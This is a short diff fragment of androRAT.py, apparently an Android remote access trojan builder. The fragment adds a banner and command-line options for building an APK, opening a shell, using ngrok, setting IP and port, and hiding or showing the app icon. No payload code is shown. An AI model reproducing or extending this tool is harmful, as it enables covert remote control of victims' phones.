@@ -17,3 +17,24 @@ except ImportError as e:
 clearDirec()
 
 # Part 1: End of androRAT.py
+# Part 2: Start of androRAT.py
+
+#                     _           _____         _______
+#     /\             | |         |  __ \     /\|__   __|
+#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
+#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
+#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
+# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
+#                                        - By karma9874
+
+parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
+parser.add_argument('--build', help='For Building the apk', action='store_true')
+parser.add_argument('--shell', help='For getting the Interpreter', action='store_true')
+parser.add_argument('--ngrok', help='For using ngrok', action='store_true')
+parser.add_argument('-i', '--ip', metavar="<IP>", type=str, help='Enter the IP')
+parser.add_argument('-p', '--port', metavar="<Port>", type=str, help='Enter the Port')
+parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Enter the apk Name')
+parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
+args = parser.parse_args()
+
+# Part 2: End of androRAT.py
